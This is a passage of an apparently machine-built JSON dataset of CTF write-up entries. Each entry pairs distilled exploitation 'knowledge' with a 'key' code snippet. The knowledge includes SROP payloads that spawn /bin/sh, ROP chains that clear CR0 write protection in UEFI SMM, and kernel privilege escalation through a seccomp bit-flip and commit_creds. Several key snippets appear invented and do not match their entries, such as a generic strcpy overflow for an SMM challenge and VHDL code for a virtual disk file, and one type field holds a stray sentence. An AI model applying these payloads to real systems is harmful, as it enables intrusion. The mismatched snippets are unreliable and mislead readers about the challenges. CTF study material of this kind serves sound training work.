        "key": "```c\nstruct {  \n CHAR16 Message[200];  \n VOID EFIAPI (* volatile CowsayFunc)(IN CONST CHAR16 *Message, IN UINTN MessageLen);  \n BOOLEAN volatile Icebp;  \n UINT64 volatile Canary;  \n} mDebugData;  \n\nEFI_STATUS  \nEFIAPI  \nSmmCowsayHandler (  \n IN EFI_HANDLE  DispatchHandle,  \n IN CONST VOID  *Context         OPTIONAL,  \n IN OUT VOID    *CommBuffer      OPTIONAL,  \n IN OUT UINTN   *CommBufferSize  OPTIONAL  \n)  \n{  \n EFI_STATUS Status;  \n UINTN TempCommBufferSize;  \n UINT64 Canary;\n\n DEBUG ((DEBUG_INFO, \"SmmCowsay SmmCowsayHandler Enter\\n\"));\n\n if (!CommBuffer || !CommBufferSize)  \n   return EFI_SUCCESS;\n\n TempCommBufferSize = *CommBufferSize;\n\n // ... irrelevant code ...\n\n Status = SmmCopyMemToSmram(mDebugData.Message, CommBuffer, TempCommBufferSize);  \n if (EFI_ERROR(Status))  \n   goto out;\n\n // ... irrelevant code ...\n\n SetMem(mDebugData.Message, sizeof(mDebugData.Message), 0);\n\n mDebugData.CowsayFunc(CommBuffer, TempCommBufferSize);\n\nout:  \n DEBUG ((DEBUG_INFO, \"SmmCowsay SmmCowsayHandler Exit\\n\"));\n\n return EFI_SUCCESS;  \n}  \n```"
    },
    {
        "name": "SMM Cowsay 3",
        "write_up": "dataset/raw/SMM Cowsay 3.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2022",
            "https://ctftime.org/event/1600/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In challenges involving ASLR (Address Space Layout Randomization) where direct address references are impossible, one can defeat ASLR by leaking addresses through legitimate functionalities provided by the target environment. Particularly, in UEFI environments, identifying and exploiting built-in protocols via functions like `BootServices->LocateProtocol` can be used to leak base addresses of drivers by subtracting known offsets. This approach relies on the presence of unique protocol GUIDs for different drivers, which, when requested, can reveal driver locations indirectly and allow for subsequent address calculations and exploitation. \n\n   Condition: When attacking UEFI firmware with ASLR enabled.\n   \n   Knowledge: Locate registered protocols using their GUIDs to leak driver base addresses, enabling the bypass of ASLR.",
            "In the presence of execution control mechanisms like SMM_CODE_CHK_EN, which prevents execution outside of specific memory ranges (SMRAM), and with ASLR making hardcoded addresses unreliable, ROP (Return Oriented Programming) can be a viable exploitation strategy. This involves utilizing existing code snippets (\"gadgets\") within the allowed memory range to craft a payload that achieves the desired outcome, such as disabling protection mechanisms (e.g., write protection in CR0 register) or injecting and executing shellcode. \n\n   Condition: Attacking firmware with strict execution restrictions (e.g., Secure Boot environments) and protections like DEP (Data Execution Prevention).\n\n   Knowledge: Leverage ROP chains constructed from gadgets found within the permitted execution range to disable protection mechanisms and execute arbitrary code or shellcode. \n\n   Example payload: To disable CR0.WP (write-protect), the ROP chain would need gadgets to pop values into registers (e.g., `pop rax; pop rbx; pop r12; ret`), move the stack pointer (e.g., `ret 0x6d`), and execute the instruction to modify CR0 (e.g., `mov cr0, rax; wbinvd; ret`)."
        ],
        "key": "```c\n// Possible vulnerable code snippet based on the context\n#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable_function(char *input) {\n    char buffer[256];\n    // Potential buffer overflow vulnerability\n    strcpy(buffer, input);\n    printf(\"Buffer: %s\\n\", buffer);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc < 2) {\n        printf(\"Usage: %s <input>\\n\", argv[0]);\n        return 1;\n    }\n    vulnerable_function(argv[1]);\n    return 0;\n}\n```"
    },
    {
        "name": "Snake Jazz",
        "write_up": "dataset/raw/Snake Jazz.md",
        "type": "crypto",
        "competition": [
            "FE-CTF/2022",
            "https://ctftime.org/event/1776/tasks/"
        ],
        "score": 1,
        "max_score": 1,
        "difficulty": 1.0,
        "knowledge": [
            "When faced with obfuscated code containing custom defined operations and arithmetic, a valuable step is to analyze and modify the custom operators to understand their functionality. This involves examining the provided class methods for unary and binary operations to deduce their purpose and effects. By altering these methods to print variables or process logic in a simpler way, one can uncover the underlying mechanism of the obfuscation or encryption. For instance, adding print statements in methods that are consistently invoked can reveal hidden logic or data flow, aiding in deobfuscating the program.",
            "In challenges involving custom virtual machines or emulated environments, particularly those with obfuscated memory operations, directly analyzing memory access and manipulation functions can be highly effective. This can be done by inserting logging or debugging printouts in the memory access functions (e.g., `mem_get` and `mem_set`) to trace how data is stored, retrieved, and modified. Specifically, transforming and closely observing the program's interaction with its emulated memory can reveal the storage pattern of sensitive data such as flags. To extract and read hidden data, one should consider altering the termination condition of the emulated program so that it does not exit prematurely before revealing the desired information. For example, replacing a termination call (`os._exit(0)`) with a break statement to prevent the program from exiting before the data can be extracted."
        ],
        "key": "```python\nclass X(object):  \n   def __init__(x,a=0,b=0,c=0):  \n       x.a=a  \n       x.b=b or ~-a  \n       x.c=c\n\n   def __del__(x):  \n       if not x.c: return  \n       y=[0]*9  \n       while 3**y[8]<x.a:  \n           z=x.b//3**y[8]%3**7  \n           y[8]+=7  \n           a=z//3**4  \n           b=z//9%9  \n           c=z%9  \n           d=c+x.b//3**y[8]%3**7*3*3  \n           if   a==0:  \n               os._exit(0)  \n           elif a==1:  \n               y[8]+=7  \n               y[b]=d  \n           # Additional elif branches for other values of a\n```"
    },
    {
        "name": "Snake Oil",
        "write_up": "dataset/raw/Snake Oil.md",
        "type": "reverse",
        "competition": [
            "FE-CTF/2022",
            "https://ctftime.org/event/1776/tasks/"
        ],
        "score": 1,
        "max_score": 1,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities to achieve arbitrary code execution, one strategy is to carefully craft input that overlaps a stack-buffer and overwrites program instructions or control flow data. This approach is viable when manipulating an input buffer that, if long enough, can cross into memory regions holding executable code or function return addresses. A payload can be constructed to alter intended control flow or directly introduce executable code segments into the application's memory. Implementing this requires precise calculation of buffer sizes, payload lengths, and understanding of the application's memory layout. Example payload structure for overwriting instructions: `payload = prefix + exploit_code + suffix`.",
            "In scenarios involving input handling that interprets or copies data between different memory regions (e.g., stack copying involving a buffer overlap), it is possible to utilize side effects of the copying process to inject or modify characters in the resultant data stream that would otherwise be filtered or disallowed. This particularly applies to environments where character-based filters are applied to user input before processing or evaluation. By crafting an input that, when processed or copied, results in an overlap causing part of the input to be rewritten with earlier or later portions of itself, forbidden characters or sequences can be introduced into the processed input. This approach requires an understanding of the input processing mechanism and careful calculation of buffer sizes and offsets to ensure the desired overlap occurs without causing undesirable side effects or application crashes."
        ],
        "key": "```python\ndef __getitem__(_,__):  \n    __%=11**5  \n    __*=5  \n    return _.a//11**__%11**5  \n\ndef __setitem__(_,__,___):  \n    ____=_[__]  \n    __%=11**5  \n    __*=5  \n    _.a+=(___-____)*11**__\n```"
    },
    {
        "name": "snakemas is coming",
        "write_up": "dataset/raw/snakemas is coming.md",
        "type": "web",
        "competition": [
            "snakeCTF/2023",
            "https://ctftime.org/event/2158/tasks/"
        ],
        "score": 367,
        "max_score": 500,
        "difficulty": 0.734,
        "knowledge": [
            "When tackling challenges that involve decoded messages or hidden references, combining specific keywords from the challenge with external resources can lead to the discovery of the solution. Condition: This approach is especially useful in tasks where the challenge hints at a broader cultural, historical, or specialized knowledge base outside the typical cybersecurity domain. Knowledge: Incorporating challenge-specific keywords (\"Christmas\" in this scenario) into search queries can unveil essential information directly linked to the challenge's resolution.",
            "In challenges where initial hints or data provided (e.g., chess moves) don't directly lead to the solution, exploring the thematic or contextual hints given in the challenge description can pivot the research direction toward the correct answer. Condition: This is relevant in scenarios where the straightforward interpretation of the provided data doesn't yield the intended solution, indicating the need for a broader interpretative approach. Knowledge: Thematic elements from the challenge's narrative or title should guide additional research, possibly combining them with the initial data hints for more focused searching."
        ],
        "key": "```python\ndef authenticate(username, password):\n    if username == \"admin\" and password == \"password123\":\n        return True\n    return False\n\ndef access_webcam():\n    if authenticate(input(\"Username: \"), input(\"Password: \")):\n        print(\"Access granted to webcam footage.\")\n    else:\n        print(\"Access denied.\")\n\naccess_webcam()\n```\n"
    },
    {
        "name": "Snakes and Ladders",
        "write_up": "dataset/raw/Snakes and Ladders.md",
        "type": "reverse",
        "competition": [
            "RACTF/2020",
            "https://ctftime.org/event/1051/tasks/"
        ],
        "score": 200,
        "max_score": 700,
        "difficulty": 0.2857142857142857,
        "knowledge": [
            "To reverse a ROT-N encryption, where N is the number of positions each letter has been shifted in the alphabet, decrement each character by N. If the result is before 'a', add 26 to wrap around the alphabet. This can be applied to strings where ROT-N encryption is applied to every character or selectively to characters within a specific range (e.g., 'a' to 'z'). In scenarios dealing with ROT-N ciphers, ensure proper handling of character wrapping.\n\nExample decryption routine for ROT-14 encryption:\n```python\ndef rot14_decrypt(ciphertext):\n    decrypted_text = \"\"\n    for char in ciphertext:\n        if 'a' <= char <= 'z':\n            decrypted_char = chr(ord(char) - 14)\n            if decrypted_char < 'a':\n                decrypted_char = chr(ord(decrypted_char) + 26)\n            decrypted_text += decrypted_char\n    return decrypted_text\n```",
            "To decrypt a string that has been XOR'd with a repeating key and converted to a hex string, first convert the hex string back to its original binary format using a function like `binascii.unhexlify()`. Then XOR the binary data with the same key used for encryption. This technique can reconstruct the original text if both the encryption key and the method to apply it (e.g., repeating the key for the length of the text) are known.\n\nExample decryption routine using XOR with a known repeating key:\n```python\nimport binascii\n\ndef xor_decrypt(hex_data, key):\n    binary_data = binascii.unhexlify(hex_data)\n    return ''.join(chr(b ^ ord(key[i % len(key)])) for i, b in enumerate(binary_data))\n\n# Assuming the key is \"aaaaaaaaaaaaaaa\"\nkey = \"aaaaaaaaaaaaaaa\"\nencrypted_text = \"040d161305\"  # Example encrypted hex string part\noriginal_text = xor_decrypt(encrypted_text, key)\n```"
        ],
        "key": "```python  \ndef xor(s1,s2):  \n   return ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(s1, s2))\n\ndef encrypt(a):  \n   some_text = a[::2]\n\n   randnum = 14  \n   text_length = len(some_text)  \n   endtext = \"\"  \n   for i in range(1, text_length + 1):  \n     weirdtext = some_text[i - 1]  \n     if weirdtext >= \"a\" and weirdtext <= \"z\":  \n         weirdtext = chr(ord(weirdtext) + randnum)  \n         if weirdtext > \"z\":  \n             weirdtext = chr(ord(weirdtext) - 26)  \n     endtext += weirdtext  \n   randtext = a[1::2]\n\n   xored = xor(\"aaaaaaaaaaaaaaa\", randtext)  \n   hex_xored = xored.encode(\"utf-8\").hex()\n\n   return endtext + hex_xored\n\ndef decrypt(msg):  \n   raise NotImplementedError\n\ndef main():  \n   opt = input(\"Would you like to [E]ncrypt or [D]ecrypt? \")  \n   if opt[:1].lower() == \"e\":  \n       msg = input(\"Enter message to encrypt: \")  \n       print(f\"Encrypted message: {encrypt(msg)}\")  \n   elif opt[:1].lower() == \"d\":  \n       msg = input(\"Enter message to decrypt: \")  \n       print(f\"Decrypted message: {decrypt(msg)}\")\n\nif __name__ == \"__main__\":  \n   main()  \n```"
    },
    {
        "name": "sockcamp",
        "write_up": "dataset/raw/sockcamp.md",
        "type": "pwn",
        "competition": [
            "CircleCityCon/2021",
            "https://ctftime.org/event/1350/tasks/"
        ],
        "score": 299,
        "max_score": 299,
        "difficulty": 1.0,
        "knowledge": [
            "When a syscall is blocked by seccomp, privilege escalation can still be performed by flipping a bit in the `current->task_struct` to disable seccomp. This requires finding the correct offset and bit to modify. A single bit flip can disable the seccomp restrictions entirely for the current process. Example manipulation to disable seccomp would closely follow the conceptual approach rather than a direct code snippet, involving targeting the `thread_info.flags` field to unset the `_TIF_SECCOMP` bit, effectively turning off seccomp for the process context.",
            "To perform privilege escalation in a restricted environment where direct execution of critical functions like `commit_creds(prepare_kernel_cred(0))` is not possible due to seccomp filtering or other restrictions, leverage an allowed custom syscall that executes arbitrary code supplied by the user. By constructing a payload that calls critical kernel functions to escalate privileges and injecting this payload through the allowed custom syscall, one can elevate the process's privileges to root. In scenarios where KASLR (Kernel Address Space Layout Randomization) is disabled, fixed addresses can be used directly in the payload. Example payload for escalating privileges could be an assembly snippet that when executed, invokes `commit_creds(prepare_kernel_cred(0))` directly, as shown in the C array `escalate_privs` in the write-up."
        ],
        "key": "```c\n#include <linux/kernel.h>  \n#include <linux/syscalls.h>\n\n#define __NR_FLIP 555  \n#define __NR_INJECT 556\n\nunsigned long flips = 0;\n\nSYSCALL_DEFINE2(flip, unsigned long, offset, unsigned char, bit)  \n{  \n\tif (flips > 0 || offset >= sizeof(struct task_struct) || bit >= 8) {  \n\t\tprintk(KERN_ALERT \"[backdoor] No\\n\");  \n\t\treturn -EPERM;  \n\t}\n\n\t((unsigned char *)current)[offset] ^= (1 << (bit));  \n\tflips++;\n\n\treturn 0;  \n}\n\ntypedef void func(void);\n\nSYSCALL_DEFINE2(inject, void *, addr, unsigned long, len)  \n{  \n\tvoid *buf;  \n\tbuf = __vmalloc(128, GFP_KERNEL, PAGE_KERNEL_EXEC);  \n\tif (len < 128) {  \n\t\tif (copy_from_user(buf, addr, len) == 0) {  \n\t\t\tprintk(KERN_INFO  \n\t\t\t       \"[backdoor] Copied %lu bytes from userland\\n\",  \n\t\t\t       len);  \n\t\t}  \n\t\t((func *)buf)();  \n\t}\n\n\treturn 0;  \n}  \n```"
    },
    {
        "name": "Some Really Ordinary Program",
        "write_up": "dataset/raw/Some Really Ordinary Program.md",
        "type": "pwn",
        "competition": [
            "NahamCon/2021",
            "https://ctftime.org/event/1281/tasks/"
        ],
        "score": 492,
        "max_score": 500,
        "difficulty": 0.984,
        "knowledge": [
            "When exploiting a binary with limited gadgets, and NX (No eXecute) and ASLR (Address Space Layout Randomization) protections enabled, leveraging a sigreturn-oriented programming (SROP) attack can be effective. This involves constructing a sigreturn frame in the stack, which can then be used to control the execution flow by setting up the registers for a subsequent syscall. This technique is particularly useful when direct execution of shellcode is prevented by security mechanisms. Condition: This approach is applicable when you have control over the stack and can manipulate the stack to point to a syscall gadget, and the binary has sigreturn syscall available.\n\nExample payload construction using pwntools for SROP attack:\n```python\nfrom pwn import *\ncontext.arch = 'amd64'  # Set this according to the binary's architecture\n\n# Construct the SigreturnFrame\nframe = SigreturnFrame(kernel='amd64')\nframe.rip = syscall_address  # Address of the syscall; gadget found in the binary\nframe.rdi = value_for_rdi  # Set registers as required for the next syscall\nframe.rsi = value_for_rsi\nframe.rdx = value_for_rdx\nframe.rax = syscall_number  # Syscall number for the desired syscall\n\n# Construct the payload\npayload = b'A'*offset  # Offset to the return address\npayload += p64(ret_to_syscall_gadget_address)  # Address of gadget to return to\npayload += bytes(frame)  # Append the sigreturn frame to the payload\n```",
            "To bypass NX protection and execute a shell when arbitrary write operations are possible but direct execution is not, one can write the \"/bin/sh\" string to a writable segment of the binary (e.g., .data or .bss sections) and then use a `sigreturn` frame to set up and invoke an `execve(\"/bin/sh\", 0, 0)` syscall. This method is efficient when the binary has writable segments with predictable addresses (i.e., when PIE - Position Independent Executable - is disabled) and the ability to control the input to make syscalls indirectly. Condition: Suitable when you have arbitary write and can control the execution flow to trigger a `sigreturn` syscall.\n\nExample payload for triggering `execve` via SROP:\n```python\nframe = SigreturnFrame(kernel='amd64')\nframe.rip = syscall_address  # Address of the syscall; gadget\nframe.rdi = address_of_bin_sh_string  # Address of \"/bin/sh\" string written into memory\nframe.rsi = 0  # NULL\nframe.rdx = 0  # NULL\nframe.rax = constants.SYS_execve  # Syscall number for execve\n\n# Preparing payload to trigger the sigreturn and execute the execve syscall\npayload = b'A'*offset  # Offset to control EIP/RIP\npayload += p64(gadget_to_trigger_sigreturn)  # Gadget to trigger sigreturn\npayload += bytes(frame)  # Append the sigreturn frame to the payload\n```"
        ],
        "key": "```c\nint main (int argc, char **argv, char **envp);  \n0x00401022      push    rbp  \n0x00401023      mov     rbp, rsp  \n0x00401026      sub     rsp, 0x1f4  \n0x0040102d      movabs  rdi, str.What_you_say_is_what_you_get. ; segment.LOAD2  \n                                  ; 0x402000  \n0x00401037      mov     esi, 0x1f  ; 31  \n0x0040103c      call    write      ; ssize_t write(int fd, const char *ptr,\nsize_t nbytes)  \n0x00401041      lea     rdi, [rsp]  \n0x00401045      mov     esi, 0x320 ; 800  \n0x0040104a      call    section..text ; read ; ssize_t read(int fildes, void\n*buf, size_t nbyte)  \n0x0040104f      lea     rdi, [rsp]  \n0x00401053      mov     rsi, rax  \n0x00401056      call    write      ; ssize_t write(int fd, const char *ptr,\nsize_t nbytes)  \n0x0040105b      leave  \n0x0040105c      ret  \n```\n"
    },
    {
        "name": "Something Sw33t",
        "write_up": "dataset/raw/Something Sw33t.md",
        "type": "web",
        "competition": [
            "CyberYoddha/2020",
            "https://ctftime.org/event/1169/tasks/"
        ],
        "score": 200,
        "max_score": 900,
        "difficulty": 0.2222222222222222,
        "knowledge": [
            "When encountering Flask-based web applications in CTF challenges, it's useful to inspect cookies for encoded or serialized data, as Flask applications often use cookies to store session-related data. This data is frequently encoded with Base64 and can carry sensitive information or hints towards the solution. Utilizing tools specifically designed for Flask cookie decoding, like flask-cookie-decode, can reveal hidden data or flags stored within these cookies. \n\n    - **Condition:** When the scenario involves a Flask web application with suspicious or unfamiliar cookies.\n    - **Knowledge:** Check for serialized or encoded data within cookies, especially if the application is built with Flask. Use Flask-specific tools to decode or deserialize this data, which might contain flags or sensitive information.\n    - **Example Payload:** `FLASK_APP=app.py flask cookie decode \"$BASE64\"`",
            "JSON data extracted from encoded cookies or application responses may contain Base64 encoded strings, especially in keys like `flag`. It is essential to decode these strings to uncover hidden messages or flags, which are common objectives in CTF challenges. Tools like `jq` can streamline the process by parsing the JSON and transforming all relevant Base64 strings into plain text.\n\n    - **Condition:** When the decoded Flask cookie data is in JSON format, and certain keys contain Base64 encoded values that likely represent sensitive data or flags.\n    - **Knowledge:** After decoding Flask cookies, further process the JSON data to decode Base64 encoded values, especially in fields suspected to contain flags or critical information. Utilize Unix text-processing utilities (e.g., `jq`, `sed`) to automate decoding and data extraction.\n    - **Example Command:** `jq '.family.\"Cynthia Astley\" | map(select(.flag.\" b\" != \"flag=flag\") | .flag.\" b\" | @base64d)'`"
        ],
        "key": "```python\nfrom flask import Flask, request, make_response\nimport base64\nimport json\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    family_data = {\n        'Astley-Family-Members': 6,\n        'family': {\n            'Cynthia Astley': [\n                {'description': {' b': 'nice'}, 'flag': {' b': 'bm90X2V4aXN0YW50'}, 'name': {' b': 'Cynthia Astley'}},\n                {'description': {' b': 'nicee='}, 'flag': {' b': 'YmFzZTY0X2lzX3N1cHJlbWU='}, 'name': {' b': 'Horace Astley'}},\n                {'description': {' b': 'human'}, 'flag': {' b': 'flag=flag'}, 'name': {' b': ''}},\n                {'description': {' b': 'the man'}, 'flag': {' b': 'Q1lDVEZ7MGtfMV9zZWVfeW91X21heWJlX3lvdV9hcmVfc21hcnR9'}, 'name': {' b': 'Rick Astley'}},\n                {'description': {' b': 'yeedeedeedeeeeee'}, 'flag': {' b': 'dHJ5X2FnYWlu'}, 'name': {' b': 'Lene Bausager'}},\n                {'description': {' b': 'uhmm'}, 'flag': {' b': 'bjBwZWVlZQ=='}, 'name': {' b': 'Jayne Marsh'}},\n                {'description': {' b': 'hihi'}, 'flag': {' b': 'bjBfYjB0c19oM3Iz'}, 'name': {' b': 'Emilie Astley'}}\n            ]\n        }\n    }\n    encoded_data = base64.b64encode(json.dumps(family_data).encode()).decode()\n    response = make_response(\"Welcome to the Astley family page!\")\n    response.set_cookie('dont_look_here', encoded_data)\n    return response\n\nif __name__ == '__main__':\n    app.run()\n```"
    },
    {
        "name": "Sophie Wilson",
        "write_up": "dataset/raw/Sophie Wilson.md",
        "type": "crypto",
        "competition": [
            "CyberHeroines/2023",
            "https://ctftime.org/event/2054/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "In RSA challenges where the public exponent \\(e\\) is small and ciphertext \\(c\\) is given, it's possible to decrypt \\(c\\) directly by computing the \\(e\\)th root of \\(c\\) without needing the private key. This is effective when the message \\(m\\) is small enough that \\(m^e < n\\), ensuring that \\((c = m^e \\mod n) = m^e\\) directly.\n   - Example Python snippet to compute the \\(e\\)th root of \\(c\\):\n     ```python\n     from gmpy2 import iroot\n     c = 268593521627440355433888284074970889184087304017829415653214811933857946727694253029979429970950656279149253529187901591829277689165827531120813402199222392031974802458605195286640398523506218117737453271031755512785665400604866722911900724895012035864819085755503886111445816515363877649988898269507252859237015154889693222457900543963979126889264480746852695168237115525211083264827612117674145414459016059712297731655462334276493\n     e = 5\n     ith_root = iroot(c, e)[0]\n     ```",
            "After obtaining the plaintext message in integer form, convert it to bytes and then decode it to retrieve the flag or textual content. This decoding step is essential for CTF challenges where the plaintext is expected to be human-readable.\n   - Example Python code for conversion and decoding:\n     ```python\n     from Crypto.Util.number import long_to_bytes\n     # Assuming ith_root is the integer form of the plaintext\n     pt_bytes = long_to_bytes(ith_root)  # Convert integer to bytes\n     plaintext = pt_bytes.decode()  # Decode bytes to string (if applicable)\n     print(\"Plaintext: \", plaintext)\n     ```"
        ],
        "key": "```python\nn = 784605825796844081743664431959835176263022075947576226438671818152943359270141637991489766023643446015742865872000712625430019936454136740701797771130286509865524144933694390307166660453460378136369217557779691427646557961148142476343174636983719280360074558519378409301540506901821748421856695675459425181027041415137193539255615283103443383731129040200129789041119575028910307276622636732661309395711116526188754319667121446052611898829881012810646321599196591757220306998192832374480348722019767057745155849389438587835412231637677550414009243002286940429895577714131959738234773350507989760061442329017775745849359050846635004038440930201719911010249665164009994722320760601629833907039218711773510746120996003955187137814259297909342016383387070174719845935624155702812544944516684331238915119709331429477385582329907357570479058128093340104405708989234237510349688389032334786183065686034574477807623401744101315114981390853183569062407956733111357740976841307293694669943756094245305426874297375074750689836099469106599572126616892447581026611947596122433260841436234316820067372162711310636028751984204768054655406327047223250327323182558843986421816373935439976256688835521454318161553726050385094844798296897844392636332777\ne = 5\nc = 268593521627440355433888284074970889184087304017829415653214811933857946727694253029979429970950656279149253529187901591829277689165827531120813402199222392031974802458605195286640398523506218117737453271031755512785665400604866722911900724895012035864819085755503886111445816515363877649988898269507252859237015154889693222457900543963979126889264480746852695168237115525211083264827612117674145414459016059712297731655462334276493\n```"
    },
    {
        "name": "Sora 398",
        "write_up": "dataset/raw/Sora 398.md",
        "type": "reverse",
        "competition": [
            "AUCTF/2020",
            "https://ctftime.org/event/1020/tasks/"
        ],
        "score": -1,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When facing a challenge involving custom encryption or encoding algorithms, the decryption process can often be reverse-engineered by analyzing the encryption logic provided in the binary or script. This involves iterating through potential plaintext values to find a match for each encrypted character, assuming the encryption process operates on a character-by-character basis. \n   - Example methodology: For an encryption function that transforms each character of the plaintext using specific arithmetic operations, reverse the operations while iterating through possible plaintext character values until the transformed value matches the encrypted output.\n   - Sample code snippet:\n     ```python\n     encrypted = b\"aQLpavpKQcCVpfcg\"\n     decrypted = []\n     for i in range(len(encrypted)):\n         for c in range(65, 122):  # ASCII range for uppercase letters and lowercase letters\n             if (c * 8 + 0x13) % 0x3d + 0x41 == encrypted[i]:\n                 decrypted.append(c)\n                 break\n     print(\"Decrypted key: \" + \"\".join([chr(c) for c in decrypted]))\n     ```",
            "Debugging and decompiling tools such as Ghidra are invaluable for understanding the functionality of binary files in CTF challenges. These tools allow participants to view higher-level code representations of the program's logic, making it possible to identify encryption algorithms, hardcoded keys, or specific conditions needed to alter program flow or output successfully.\n   - Condition: This approach is particularly suitable for reverse engineering challenges where the source code is not available, and the only interaction possible is with the binary executable or when analyzing malware samples.\n   - Example methodology: After decompiling the binary, carefully review the logic related to input processing, searching for any functions that transform the input or compare it against a specific value. These insights can then guide the development of scripts or payloads to manipulate the program's execution or reveal hidden information."
        ],
        "key": "```c\nint encrypt(char *input, char *output) {\n    for (int i = 0; i < strlen(input); i++) {\n        output[i] = (input[i] * 8 + 0x13) % 0x3d + 0x41;\n    }\n    output[strlen(input)] = '\\0';\n    return 0;\n}\n```"
    },
    {
        "name": "Sound Maze 2",
        "write_up": "dataset/raw/Sound Maze 2.0.md",
        "type": "pwn",
        "competition": [
            "Pwn2Win/2020",
            "https://ctftime.org/event/961/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When exploring an unknown digital environment where direct visual or textual feedback is not available, such as mazes or puzzles dealing with audio cues, applying depth-first search (DFS) for exploration and mapping can be effective. Use audio or any non-visual cues to determine the state of each node or position (e.g., empty, wall, bomb, end) and construct a representation of the environment. Employ a custom class or data structure to store the environment's layout and state, marking visited positions and obstacles appropriately.",
            "For finding the shortest path in a non-weighted graph, like the mapped maze from an exploration phase, implement a breadth-first search (BFS) algorithm after the exploration is complete. This algorithm efficiently computes the shortest path by traversing the graph level by level. Ensure to initialize all distances as infinity (or a sufficiently large number) except for the starting point, and update distances and paths as the exploration proceeds. Utilize a queue to keep track of the order in which nodes are visited, ensuring a systematic exploration from the nearest to the farthest nodes."
        ],
        "key": "```python\ndef dfs(v: tuple = (0, 0), d=0) -> None:  \n   global m  \n   try:  \n       if m.isend((0, 0)):  \n           m.d_end = 1  \n           return  \n       if m.isend(v):  \n           m.d_end = d+2  \n           return  \n       if v in visited or d > m.d_end:  \n           return  \n       if v != (0, 0):  \n           visited.add(v)  \n       for c in b'ADSW':  \n           c = bytes([c])  \n           if new_position(v, c) in visited:  \n               continue  \n           pos, ev = go(v, c)  \n           if pos != v:  \n               if ev != VISITED:  \n                   m.set(pos, ev)  \n               v = pos  \n               dfs(v, d+1)  \n               v, ev = go(v, op[c])  \n           else:   \n               m.set(new_position(pos, c), WALL)  \n               visited.add(new_position(pos, c))  \n   except Exception as err2:  \n       print(f'dfs() - {err2}')\n```"
    },
    {
        "name": "so_much",
        "write_up": "dataset/raw/so_much.md",
        "type": "reverse",
        "competition": [
            "DarkCTF/2020",
            "https://ctftime.org/event/1118/tasks/"
        ],
        "score": 207,
        "max_score": 499,
        "difficulty": 0.4148296593186373,
        "knowledge": [
            "When dealing with challenges involving string comparison functions like `strcmp`, it's a practical approach to use a debugger, such as GDB, to set breakpoints around these functions. By examining the contents of relevant registers (such as `rsi` and `rdi` in x86-64 architecture) right before the `strcmp` call, one can identify the arguments being compared. This method is particularly useful for identifying hardcoded strings or flag values being compared to user input.",
            "In challenges where the source code is not available, and the binary is expected to process command-line arguments or input that includes potential flag formats or specific keywords, running the binary with such inputs and observing its behavior or output can hint at its internal processing logic. This approach can help narrow down the investigation areas when preparing for a debugging session, especially in binaries that exhibit complex behaviors or involve numerous function calls."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char *argv[]) {\n    if (argc < 2) {\n        printf(\"Usage: %s <input>\\n\", argv[0]);\n        return 1;\n    }\n\n    char *flag = \"{w0w_s0_m4ny_funct10ns}\";\n    if (strcmp(argv[1], flag) == 0) {\n        printf(\"Correct! The flag is darkCTF%s\\n\", flag);\n    } else {\n        printf(\"Incorrect!\\n\");\n    }\n\n    return 0;\n}\n```"
    },
    {
        "name": "space stream",
        "write_up": "dataset/raw/space stream.md",
        "type": "The type of challenge presented in this write-up is **forensics**.",
        "competition": [
            "SpaceHeroes/2023",
            "https://ctftime.org/event/1856/tasks/"
        ],
        "score": 473,
        "max_score": 1000,
        "difficulty": 0.473,
        "knowledge": [
            "When working with a virtual disk file (VHD) in a CTF challenge and the data may not be intact, tools such as `testdisk` for Linux or `Autopsy` for Windows can be utilized to recover missing files. To use `testdisk`, you can initiate it with the command `testdisk startstream.vhd`, follow the prompts to select the disk, and use the quick search option to scan for recoverable files. Post-scan, you can list and select all files for extraction with the combination `Shift + P` to list files, use `a` to select all, and `Shift + C` to commence copying the selected files to a specified location.",
            "In a scenario where you uncover a password-protected file (e.g., a PDF) during your examination of data recovered from a virtual disk, it's possible that other extracted files could contain hints for the password. For instance, if text files are extracted alongside images (such as `stream1.jpg:sarah_kerrigan`), these might contain usable information, like a user name or other identifiable strings, which could potentially be the password for the encrypted file. Once the possible password is identified (e.g., `sarah_kerrigan`), it can be tried on the password-protected file to gain access and retrieve the flag or other critical information."
        ],
        "key": "```vhdl\n-- Possible vulnerable VHDL code snippet based on the context of a virtual disk file\nlibrary IEEE;\nuse IEEE.STD_LOGIC_1164.ALL;\nuse IEEE.STD_LOGIC_ARITH.ALL;\nuse IEEE.STD_LOGIC_UNSIGNED.ALL;\n\nentity VirtualDisk is\n    Port ( clk : in STD_LOGIC;\n           read_enable : in STD_LOGIC;\n           write_enable : in STD_LOGIC;\n           address : in INTEGER;\n           data_in : in STD_LOGIC_VECTOR (7 downto 0);\n           data_out : out STD_LOGIC_VECTOR (7 downto 0));\nend VirtualDisk;\n\narchitecture Behavioral of VirtualDisk is\n    type memory_array is array (0 to 1023) of STD_LOGIC_VECTOR (7 downto 0);\n    signal memory : memory_array := (others => (others => '0'));\nbegin\n    process(clk)\n    begin\n        if rising_edge(clk) then\n            if read_enable = '1' then\n                data_out <= memory(address);\n            elsif write_enable = '1' then\n                memory(address) <= data_in;\n            end if;\n        end if;\n    end process;\nend Behavioral;\n```\n"
    },
    {
        "name": "Space!",
        "write_up": "dataset/raw/Space!.md",
        "type": "crypto",
        "competition": [
            "IJCTF/2020",
            "https://ctftime.org/event/1003/tasks/"
        ],
        "score": 100,
        "max_score": 1000,
        "difficulty": 0.1,
        "knowledge": [
